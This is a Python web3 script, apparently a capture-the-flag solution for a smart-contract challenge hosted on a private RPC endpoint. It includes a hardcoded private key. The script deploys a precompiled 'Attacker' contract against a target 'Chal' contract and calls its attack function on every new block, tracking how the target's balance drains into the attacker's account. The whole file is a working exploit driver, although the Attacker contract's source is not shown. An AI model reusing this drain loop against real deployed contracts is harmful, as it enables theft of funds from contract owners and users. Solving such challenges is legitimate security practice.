import json
from web3 import Web3

CHALLENGE_RPC = "10.80.3.94:8545"
INSTANCE_UUID = "03c2939d-b665-4185-8f52-b8dbc2959019"

PRIVATE_KEY = "0x8d4a163d4066f854f6ff251e3b18104a3ae8491a81204a8a8be253fd062c5d36"

# Contracts
SETUP_CONTRACT_ADDRESS = "0xa77aaa22c4D6b86B9007dc817c87C1a4f666F060"

w3 = Web3(Web3.HTTPProvider(f'http://{CHALLENGE_RPC}/{INSTANCE_UUID}'))

def main():
    # Connect to a remote RPC
    print("Connected:", w3.is_connected())

    # Import the Setup contract
    with open("compiled_Setup.sol.json", "r") as file:
        compiled_setup = file.read()
    
    setup_abi = json.loads(compiled_setup)["contracts"]["Setup.sol"]["Setup"]["abi"]
    setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=setup_abi)

    print("Setup contract loaded at:", SETUP_CONTRACT_ADDRESS)

    # Get the TARGET variable to get the Chal contract address
    chal_address = setup_contract.functions.TARGET().call()
    print("Chal contract address:", chal_address)

    chal_balance_eth = w3.from_wei(w3.eth.get_balance(chal_address), 'ether')
    print("Chal contract balance:", chal_balance_eth, "ETH")

    # Get our own balance
    acct = w3.eth.account.from_key(PRIVATE_KEY)
    my_balance_eth = w3.from_wei(w3.eth.get_balance(acct.address), 'ether')
    print("Our account address:", acct.address)
    print("Our account balance:", my_balance_eth, "ETH")

    # Attack once and then after every new block is mined
    # Call the `attack` function on the Attacker contract here
    with open("compiled_Attacker.sol.json", "r") as file:
        compiled_attacker = file.read()
    attacker_abi = json.loads(compiled_attacker)["contracts"]["Attacker.sol"]["Attacker"]["abi"]
    attacker_bytecode = json.loads(compiled_attacker)["contracts"]["Attacker.sol"]["Attacker"]["evm"]["bytecode"]["object"]

    # Deploy the Attacker contract
    Attacker = w3.eth.contract(abi=attacker_abi, bytecode=attacker_bytecode)
    construct_txn = Attacker.constructor(chal_address).build_transaction({
        'from': acct.address,
        'nonce': w3.eth.get_transaction_count(acct.address),
        'gas': 3000000,
        'gasPrice': w3.to_wei('20', 'gwei')
    })
    signed_txn = w3.eth.account.sign_transaction(construct_txn, private_key=PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    attacker_contract_address = tx_receipt.contractAddress
    print("Attacker contract deployed at:", attacker_contract_address)

    # Call the attack function
    last_mined_block = w3.eth.block_number

    attacker_contract = w3.eth.contract(address=attacker_contract_address, abi=attacker_abi)
    attack_txn = attacker_contract.functions.attack().build_transaction({
        'from': acct.address,
        'nonce': w3.eth.get_transaction_count(acct.address),
        'gas': 3000000,
        'gasPrice': w3.to_wei('20', 'gwei')
    })
    signed_attack_txn = w3.eth.account.sign_transaction(attack_txn, private_key=PRIVATE_KEY)
    attack_tx_hash = w3.eth.send_raw_transaction(signed_attack_txn.raw_transaction)
    attack_tx_receipt = w3.eth.wait_for_transaction_receipt(attack_tx_hash)
    print("Attack transaction mined:", attack_tx_receipt.transactionHash.hex())

    # Wait for new blocks
    while True:
        current_block = w3.eth.block_number
        if current_block > last_mined_block:
            print("New block mined:", current_block)
            last_mined_block = current_block

            # Call the attack function again
            attack_txn = attacker_contract.functions.attack().build_transaction({
                'from': acct.address,
                'nonce': w3.eth.get_transaction_count(acct.address),
                'value': w3.to_wei(5, 'ether'),
                'gas': 3000000,
                'gasPrice': w3.to_wei('20', 'gwei')
            })
            signed_attack_txn = w3.eth.account.sign_transaction(attack_txn, private_key=PRIVATE_KEY)
            attack_tx_hash = w3.eth.send_raw_transaction(signed_attack_txn.raw_transaction)
            attack_tx_receipt = w3.eth.wait_for_transaction_receipt(attack_tx_hash)
            print("Attack transaction mined:", attack_tx_receipt.transactionHash.hex())

            # Print remote and current balances
            chal_balance_eth = w3.from_wei(w3.eth.get_balance(chal_address), 'ether')
            my_balance_eth = w3.from_wei(w3.eth.get_balance(acct.address), 'ether')
            
            print("Chal contract balance:", chal_balance_eth, "ETH")
            print("Our account balance:", my_balance_eth, "ETH")

if __name__ == "__main__":
    main()